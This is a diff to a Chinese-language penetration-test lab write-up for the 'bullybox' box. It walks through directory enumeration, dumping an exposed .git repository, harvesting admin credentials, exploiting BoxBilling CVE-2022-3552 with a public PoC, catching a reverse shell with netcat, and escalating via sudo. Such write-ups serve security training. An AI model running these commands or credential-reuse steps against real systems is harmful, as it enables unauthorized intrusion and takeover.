@@ -33,15 +33,11 @@ echo "192.168.149.27   bullybox.local" | tee -a /etc/hosts
 - fiii : Test123456
 ```
 
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/3.png" alt=""><figcaption></figcaption></figure>
 
 * 登录后并没有任何发现，只得知当前系统使用的是boxbilling程序：
 
-
+<figure><img src="../../.gitbook/assets/4.png" alt=""><figcaption></figcaption></figure>
 
 * 枚举80端口上的隐藏文件/目录，这里发现一些/.git目录：
 
@@ -49,7 +45,7 @@ echo "192.168.149.27   bullybox.local" | tee -a /etc/hosts
 gobuster dir -u http://bullybox.local -w /usr/share/seclists/Discovery/Web-Content/common.txt
 ```
 
-
+<figure><img src="../../.gitbook/assets/5 (1).png" alt=""><figcaption></figcaption></figure>
 
 * 使用git-dumper提取目标网站的git中的内容：
 
@@ -57,7 +53,9 @@ gobuster dir -u http://bullybox.local -w /usr/share/seclists/Discovery/Web-Conte
 git-dumper http://bullybox.local/.git .
 ```
 
+<figure><img src="../../.gitbook/assets/6.png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../.gitbook/assets/7 .png" alt=""><figcaption></figcaption></figure>
 
 * 在提取出来的文件中，**bb-config.php**中发现管理员凭证：
 
@@ -66,35 +64,46 @@ git-dumper http://bullybox.local/.git .
 - admin@bullybox.local
 ```
 
-
+<figure><img src="../../.gitbook/assets/8.png" alt=""><figcaption></figcaption></figure>
 
 * 使用该有效凭证进入admin的管理界面后，获取到当前运行的软件BoxBilling及其版本号：**BoxBilling 4.22.1.5**
 
+<figure><img src="../../.gitbook/assets/9 .png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../.gitbook/assets/10.png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/11.png" alt=""><figcaption></figcaption></figure>
 
 ### 漏洞查阅
 
+* 根据应用及其版本号，查询到公开漏洞：CVE-2022-3552
+* BoxBilling<=4.22.1.5 - Remote Code Execution
 
+<figure><img src="../../.gitbook/assets/13.png" alt=""><figcaption></figcaption></figure>
 
+* [https://www.exploit-db.com/exploits/51108](https://www.exploit-db.com/exploits/51108)
 
-
-
+<figure><img src="../../.gitbook/assets/12.png" alt=""><figcaption></figcaption></figure>
 
 ### 漏洞利用
 
+* 在GitHub上找到了相关PoC：
 
+<figure><img src="../../.gitbook/assets/17.png" alt=""><figcaption></figcaption></figure>
 
+### Get Shell
 
+* 修改脚本并利用：
 
+```bash
+python3 cve-2022-3552.py -d http://bullybox.local/ -u 'admin@bullybox.local' -p 'Playing-Unstylish7-Provided'
 
+nc -lvnp 4444
+```
 
+<figure><img src="../../.gitbook/assets/14.png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../.gitbook/assets/15.png" alt=""><figcaption></figcaption></figure>
 
 ## 权限提升
 
@@ -106,9 +115,4 @@ git-dumper http://bullybox.local/.git .
 sudo su
 ```
 
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/16.png" alt=""><figcaption></figcaption></figure>
